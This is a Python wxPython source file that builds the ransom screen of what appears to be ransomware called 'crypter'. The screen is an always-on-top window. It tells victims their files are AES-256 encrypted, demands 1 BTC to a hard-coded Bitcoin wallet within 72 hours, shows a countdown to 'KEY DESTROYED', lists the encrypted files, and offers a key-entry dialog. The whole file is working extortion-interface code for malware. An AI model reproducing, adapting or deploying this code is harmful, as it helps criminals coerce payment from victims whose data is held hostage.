'''
Created on 23 Mar 2017

@author: sithis
'''

'''
Created on 24 Mar 2017

@author: sithis
'''

# Import libs
import time

# Import classes


# -*- coding: utf-8 -*- 

###########################################################################
## Python code generated with wxFormBuilder (version Jun 17 2015)
## http://www.wxformbuilder.org/
##
## PLEASE DO "NOT" EDIT THIS FILE!
###########################################################################

import wx
import wx.xrc

###########################################################################
## Class MyFrame1
###########################################################################

class MyFrame1 ( wx.Frame ):
    
    def __init__( self, parent, image_path, KEY_DESTRUCT_TIME_SECONDS, start_time, file_list_path, decrypter):
        self.message = "blank"
        self.image_path = image_path
        self.decrypter = decrypter
        self.file_list_path = file_list_path
        # Time if initial encryption
        self.start_time = start_time
        self.KEY_DESTRUCT_TIME_SECONDS = KEY_DESTRUCT_TIME_SECONDS
        
        wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 900,700 ), style = wx.CAPTION|wx.TAB_TRAVERSAL|wx.STAY_ON_TOP|wx.MINIMIZE_BOX|wx.SYSTEM_MENU|wx.CLOSE_BOX )
        
        self.SetSizeHintsSz( wx.DefaultSize, wx.DefaultSize )
        
        bSizer1 = wx.BoxSizer( wx.HORIZONTAL )
        
        self.m_panel1 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        self.m_panel1.SetBackgroundColour( wx.Colour( 177, 7, 24 ) )
        
        bSizer9 = wx.BoxSizer( wx.VERTICAL )
        
        
        bSizer9.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        self.m_panel341 = wx.Panel( self.m_panel1, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        bSizer101 = wx.BoxSizer( wx.HORIZONTAL )
        
        self.m_panel331 = wx.Panel( self.m_panel341, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        bSizer151 = wx.BoxSizer( wx.HORIZONTAL )
        
        
        bSizer151.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        self.m_bitmap7 = wx.StaticBitmap( self.m_panel331, wx.ID_ANY, wx.Bitmap( u"%s\\crypter.bmp" % self.image_path, wx.BITMAP_TYPE_ANY ), wx.DefaultPosition, wx.DefaultSize, 0 )
        bSizer151.Add( self.m_bitmap7, 0, wx.ALL, 5 )
        
        
        bSizer151.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        
        self.m_panel331.SetSizer( bSizer151 )
        self.m_panel331.Layout()
        bSizer151.Fit( self.m_panel331 )
        bSizer101.Add( self.m_panel331, 1, wx.EXPAND |wx.ALL, 5 )
        
        
        self.m_panel341.SetSizer( bSizer101 )
        self.m_panel341.Layout()
        bSizer101.Fit( self.m_panel341 )
        bSizer9.Add( self.m_panel341, 1, wx.EXPAND |wx.ALL, 5 )
        
        self.m_panel34 = wx.Panel( self.m_panel1, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        bSizer10 = wx.BoxSizer( wx.HORIZONTAL )
        
        self.m_panel33 = wx.Panel( self.m_panel34, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        bSizer15 = wx.BoxSizer( wx.HORIZONTAL )
        
        
        bSizer15.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        self.m_bitmap5 = wx.StaticBitmap( self.m_panel33, wx.ID_ANY, wx.Bitmap( u"%s\\encrypt_message.bmp" % self.image_path, wx.BITMAP_TYPE_ANY ), wx.DefaultPosition, wx.DefaultSize, 0 )
        bSizer15.Add( self.m_bitmap5, 0, wx.ALL, 5 )
        
        
        bSizer15.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        
        self.m_panel33.SetSizer( bSizer15 )
        self.m_panel33.Layout()
        bSizer15.Fit( self.m_panel33 )
        bSizer10.Add( self.m_panel33, 1, wx.EXPAND |wx.ALL, 5 )
        
        
        self.m_panel34.SetSizer( bSizer10 )
        self.m_panel34.Layout()
        bSizer10.Fit( self.m_panel34 )
        bSizer9.Add( self.m_panel34, 1, wx.EXPAND |wx.ALL, 5 )
        
        self.m_panel12 = wx.Panel( self.m_panel1, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        bSizer11 = wx.BoxSizer( wx.HORIZONTAL )
        
        
        bSizer11.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        self.m_bitmap4 = wx.StaticBitmap( self.m_panel12, wx.ID_ANY, wx.Bitmap( u"%s\\crypter_logo_small.bmp" % self.image_path, wx.BITMAP_TYPE_ANY ), wx.DefaultPosition, wx.Size( -1,-1 ), 0 )
        bSizer11.Add( self.m_bitmap4, 0, wx.ALL, 5 )
        
        
        bSizer11.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        self.m_panel46 = wx.Panel( self.m_panel12, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        self.m_panel46.SetBackgroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_BTNHIGHLIGHT ) )
        
        bSizer25 = wx.BoxSizer( wx.VERTICAL )
        
        self.m_staticText13 = wx.StaticText( self.m_panel46, wx.ID_ANY, u"The important files on your computer have been encrypted with military grade AES-256 bit encryption. \n\nYour documents, videos, images and other forms of data are now inaccessible, and cannot be unlocked without the decryption key. This key is currently being stored on a remote server\n\nTo acquire this key, transfer a total of 1 BTC to the Bitcoin wallet address below within 72 hours. \n\nIf you fail to take action within this window, the decryption key will be destroyed and access to your files will be permanently lost.", wx.DefaultPosition, wx.DefaultSize, 0 )
        self.m_staticText13.Wrap( 400 )
        self.m_staticText13.SetFont( wx.Font( 12, 74, 90, 90, False, "Lucida Sans Unicode" ) )
        
        bSizer25.Add( self.m_staticText13, 0, wx.ALL, 5 )
        
        
        self.m_panel46.SetSizer( bSizer25 )
        self.m_panel46.Layout()
        bSizer25.Fit( self.m_panel46 )
        bSizer11.Add( self.m_panel46, 1, wx.EXPAND |wx.ALL, 5 )
        
        
        bSizer11.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        
        self.m_panel12.SetSizer( bSizer11 )
        self.m_panel12.Layout()
        bSizer11.Fit( self.m_panel12 )
        bSizer9.Add( self.m_panel12, 1, wx.EXPAND |wx.ALL, 5 )
        
        
        bSizer9.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        self.m_panel121 = wx.Panel( self.m_panel1, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        bSizer30 = wx.BoxSizer( wx.HORIZONTAL )
        
        
        bSizer30.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        self.m_bitmap17 = wx.StaticBitmap( self.m_panel121, wx.ID_ANY, wx.Bitmap( u"%s\\key_destruction.bmp" % self.image_path, wx.BITMAP_TYPE_ANY ), wx.DefaultPosition, wx.DefaultSize, 0 )
        bSizer30.Add( self.m_bitmap17, 0, wx.ALL, 5 )

        self.m_staticText17 = wx.StaticText( self.m_panel121, wx.ID_ANY, u"%s" % self.time_remaining(), wx.DefaultPosition, wx.DefaultSize, 0 )
        self.m_staticText17.Wrap( -1 )
        self.m_staticText17.SetFont( wx.Font( 16, 74, 90, 92, True, "Arial" ) )
        self.m_staticText17.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_3DLIGHT ) )
        
        bSizer30.Add( self.m_staticText17, 0, wx.ALL, 5 )
        
        
        bSizer30.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        
        self.m_panel121.SetSizer( bSizer30 )
        self.m_panel121.Layout()
        bSizer30.Fit( self.m_panel121 )
        bSizer9.Add( self.m_panel121, 1, wx.EXPAND |wx.ALL, 5 )
        
        self.m_panel1211 = wx.Panel( self.m_panel1, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        bSizer301 = wx.BoxSizer( wx.HORIZONTAL )
        
        
        bSizer301.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        self.m_bitmap141 = wx.StaticBitmap( self.m_panel1211, wx.ID_ANY, wx.Bitmap( u"%s\\wallet_address.bmp" % self.image_path, wx.BITMAP_TYPE_ANY ), wx.DefaultPosition, wx.DefaultSize, 0 )
        bSizer301.Add( self.m_bitmap141, 0, wx.ALL, 5 )
        
        self.m_staticText171 = wx.StaticText( self.m_panel1211, wx.ID_ANY, u"12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay", wx.DefaultPosition, wx.DefaultSize, 0 )
        self.m_staticText171.Wrap( -1 )
        self.m_staticText171.SetFont( wx.Font( 16, 74, 90, 92, True, "Arial" ) )
        self.m_staticText171.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_3DLIGHT ) )
        
        bSizer301.Add( self.m_staticText171, 0, wx.ALL, 5 )
        
        
        bSizer301.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        
        self.m_panel1211.SetSizer( bSizer301 )
        self.m_panel1211.Layout()
        bSizer301.Fit( self.m_panel1211 )
        bSizer9.Add( self.m_panel1211, 1, wx.EXPAND |wx.ALL, 5 )
        
        
        self.m_panel11 = wx.Panel( self.m_panel1, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        bSizer111 = wx.BoxSizer( wx.HORIZONTAL )
        
        self.m_button1 = wx.Button( self.m_panel11, wx.ID_ANY, u"View Encrypted Files", wx.DefaultPosition, wx.Size(-1, 40), 0 )
        bSizer111.Add( self.m_button1, 0, wx.ALL, 5 )
        
        
        bSizer111.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        self.m_button11 = wx.Button( self.m_panel11, wx.ID_ANY, u"Enter Decryption Key", wx.DefaultPosition, wx.Size(-1, 40), 0 )
        bSizer111.Add( self.m_button11, 0, wx.ALL, 5 )
        
        
        self.m_panel11.SetSizer( bSizer111 )
        self.m_panel11.Layout()
        bSizer111.Fit( self.m_panel11 )
        bSizer9.Add( self.m_panel11, 1, wx.EXPAND|wx.ALL, 5 )
        
        
        self.m_panel1.SetSizer( bSizer9 )
        self.m_panel1.Layout()
        bSizer9.Fit( self.m_panel1 )
        bSizer1.Add( self.m_panel1, 1, wx.EXPAND |wx.ALL, 0 )
        
        self.m_panel2 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        self.m_panel2.SetBackgroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_GRAYTEXT ) )
        self.m_panel2.Hide()
        
        gSizer2 = wx.GridSizer( 0, 2, 0, 0 )
        
        
        self.m_panel2.SetSizer( gSizer2 )
        self.m_panel2.Layout()
        gSizer2.Fit( self.m_panel2 )
        bSizer1.Add( self.m_panel2, 2, wx.EXPAND |wx.ALL, 5 )
        
        
        self.SetSizer( bSizer1 )
        self.Layout()
        
        # Create timer
        self.m_timer2 = wx.Timer()
        self.m_timer2.SetOwner( self, wx.ID_ANY )
        self.m_timer2.Start( 500 )
        
        self.Bind(wx.EVT_TIMER, self.blink, self.m_timer2)
        
        # Create button events
        self.Bind(wx.EVT_BUTTON, self.files_dialog, self.m_button1)
        self.Bind(wx.EVT_BUTTON, self.decrypt_dialog, self.m_button11)
        
        self.Centre( wx.BOTH )
        
    
    def files_dialog(self, event):
        # Controls the encrypted files list dialog
        
        dialog = MyFrame2(self, self.file_list_path)
        dialog.Show()
        
    def decrypt_dialog(self, event):
        # Controls the decryption dialog 
        
        dialog = MyDialog1(self, self.decrypter)
        dialog.Show()
        
    def time_remaining(self):
        # Get's time remaining until key destruction
        
        seconds_elapsed = int(time.time() - int(self.start_time))
    
        _time_remaining = self.KEY_DESTRUCT_TIME_SECONDS - seconds_elapsed
        if _time_remaining <= 0:
            return "KEY DESTROYED"
        
        minutes, seconds = divmod(_time_remaining, 60)
        hours, minutes = divmod(minutes, 60)

        return "%d:%02d:%02d" % (hours, minutes, seconds)
        
    
    def blink(self, event):
        # Blink
        
        # Blink Image
        if self.message == "blank":
            self.m_bitmap5.SetBitmap(wx.NullBitmap)
            self.message  = "text"
        else:
            self.m_bitmap5.SetBitmap(wx.Bitmap(u"%s\\encrypt_message.bmp" % self.image_path, wx.BITMAP_TYPE_ANY))
            self.message  = "blank"
            
        # Update the time remaining
        self.m_staticText17.SetLabelText((self.time_remaining()))

        
    
    def __del__( self ):
        pass
    

###########################################################################
## Class MyFrame2
###########################################################################

class MyFrame2 ( wx.Frame ):
    
    def __init__( self, parent, file_path_list ):
        self.file_path_list = file_path_list
        wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 500,300 ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL|wx.STAY_ON_TOP )
        
        self.SetSizeHintsSz( wx.DefaultSize, wx.DefaultSize )
        
        bSizer12 = wx.BoxSizer( wx.VERTICAL )
        
        self.m_panel13 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        bSizer13 = wx.BoxSizer( wx.VERTICAL )
        
        self.m_textCtrl1 = wx.TextCtrl( self.m_panel13, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, wx.TE_DONTWRAP|wx.TE_MULTILINE|wx.TE_READONLY )
        self.m_textCtrl1.LoadFile(self.file_path_list)
        bSizer13.Add( self.m_textCtrl1, 3, wx.ALL|wx.EXPAND, 5 )
        
        
        self.m_panel13.SetSizer( bSizer13 )
        self.m_panel13.Layout()
        bSizer13.Fit( self.m_panel13 )
        bSizer12.Add( self.m_panel13, 1, wx.ALL|wx.EXPAND, 5 )
        
        
        self.SetSizer( bSizer12 )
        self.Layout()
        
        self.Centre( wx.BOTH )
    
    def __del__( self ):
        pass


###########################################################################
## Class MyDialog1
###########################################################################

class MyDialog1 ( wx.Dialog ):
    
    def __init__( self, parent, decrypter ):
        self.decrypter = decrypter
        wx.Dialog.__init__ ( self, parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 500,200 ), style = wx.DEFAULT_DIALOG_STYLE|wx.STAY_ON_TOP )
        
        self.SetSizeHintsSz( wx.DefaultSize, wx.DefaultSize )
        
        bSizer14 = wx.BoxSizer( wx.VERTICAL )
        
        self.m_panel14 = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
        sbSizer2 = wx.StaticBoxSizer( wx.StaticBox( self.m_panel14, wx.ID_ANY, u"AES Decryption Key" ), wx.VERTICAL )
        
        
        sbSizer2.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        
        sbSizer2.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        bSizer16 = wx.BoxSizer( wx.HORIZONTAL )
        
        
        bSizer16.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        self.m_textCtrl2 = wx.TextCtrl( sbSizer2.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
        self.m_textCtrl2.SetMaxLength( 32 ) 
        self.m_textCtrl2.SetMinSize( wx.Size( 220,-1 ) )
        
        bSizer16.Add( self.m_textCtrl2, 0, wx.ALL, 5 )
        
        
        bSizer16.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        
        sbSizer2.Add( bSizer16, 1, wx.EXPAND, 5 )
        
        
        sbSizer2.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
        
        m_sdbSizer1 = wx.StdDialogButtonSizer()
        self.m_sdbSizer1OK = wx.Button( sbSizer2.GetStaticBox(), wx.ID_OK )
        m_sdbSizer1.AddButton( self.m_sdbSizer1OK )
        self.m_sdbSizer1Cancel = wx.Button( sbSizer2.GetStaticBox(), wx.ID_CANCEL )
        m_sdbSizer1.AddButton( self.m_sdbSizer1Cancel )
        m_sdbSizer1.Realize();
        
        sbSizer2.Add( m_sdbSizer1, 1, wx.EXPAND, 5 )
        
        self.m_staticText6 = wx.StaticText( sbSizer2.GetStaticBox(), wx.ID_ANY, u"Waiting for input", wx.DefaultPosition, wx.DefaultSize, 0 )
        self.m_staticText6.Wrap( -1 )
        sbSizer2.Add( self.m_staticText6, 0, wx.ALL, 5 )
        
        self.m_gauge1 = wx.Gauge( sbSizer2.GetStaticBox(), wx.ID_ANY, 100, wx.DefaultPosition, wx.DefaultSize, wx.GA_HORIZONTAL )
        self.m_gauge1.SetValue( 0 ) 
        sbSizer2.Add( self.m_gauge1, 0, wx.ALL, 5 )
        
        
        self.m_panel14.SetSizer( sbSizer2 )
        self.m_panel14.Layout()
        sbSizer2.Fit( self.m_panel14 )
        bSizer14.Add( self.m_panel14, 1, wx.EXPAND |wx.ALL, 5 )
        
        
        # Button event for OK
        self.Bind(wx.EVT_BUTTON, self.decrypt, self.m_sdbSizer1OK)
        
        
        self.SetSizer( bSizer14 )
        self.Layout()
        
        self.Centre( wx.BOTH )
        
        
    def decrypt(self, event):
        # Function to call decryption of encrypted files
        
        # Get value of box
        key_contents = self.m_textCtrl2.GetLineText(0)
        
        # Check for valid key
        if len(key_contents) < 32:
            self.m_staticText6.SetLabelText("Invalid Key!")
            return
        else:
            self.m_staticText6.SetLabelText("Decrypting! Please Wait")
            
        # Now start the decryption 
        self.decrypter.decrypt_files()
        self.m_gauge1.SetValue(100)
        self.m_staticText6.SetLabelText("Decryption Complete!")
    
    def __del__( self ):
        pass
    

